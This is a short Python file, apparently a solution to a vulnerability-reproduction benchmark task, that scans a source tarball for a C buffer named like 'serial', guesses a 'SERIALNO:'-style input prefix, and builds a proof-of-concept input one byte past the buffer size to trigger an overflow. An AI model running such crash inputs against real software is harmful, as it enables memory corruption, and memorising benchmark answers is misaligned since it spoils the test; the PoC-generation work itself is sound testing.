import tarfile, re, os

class Solution:
    def _detect_serial_array_size(self, tar):
        min_size = None
        pattern = re.compile(r'char\s+\w*serial\w*\s*\[\s*(\d+)\s*\]', re.I)
        for member in tar.getmembers():
            if member.isfile() and member.name.endswith(('.c', '.h', '.cpp', '.cc', '.cxx', '.hpp')):
                f = tar.extractfile(member)
                if f is None:
                    continue
                try:
                    data = f.read().decode('latin1', errors='ignore')
                except Exception:
                    continue
                for match in pattern.finditer(data):
                    size = int(match.group(1))
                    if size > 0 and (min_size is None or size < min_size):
                        min_size = size
        return min_size or 16  # default fallback if not found

    def _detect_prefix(self, tar):
        possible_prefixes = [b'SERIALNO:', b'SERIALNO=', b'SERIAL:', b'SERIAL=']
        text = b''
        for member in tar.getmembers():
            if member.isfile() and member.size <= 1_000_000:  # limit size
                f = tar.extractfile(member)
                if f is None:
                    continue
                try:
                    text += f.read()
                except Exception:
                    continue
        for p in possible_prefixes:
            if p in text:
                return p
        return b''

    def solve(self, src_path: str) -> bytes:
        with tarfile.open(src_path, 'r:*') as tar:
            size = self._detect_serial_array_size(tar)
            tar.members  # keep tar open for next read
            prefix = self._detect_prefix(tar)

        serial_overflow = b'0' * (size + 1)  # just over the limit
        poc = prefix + serial_overflow + b'\n'
        return poc
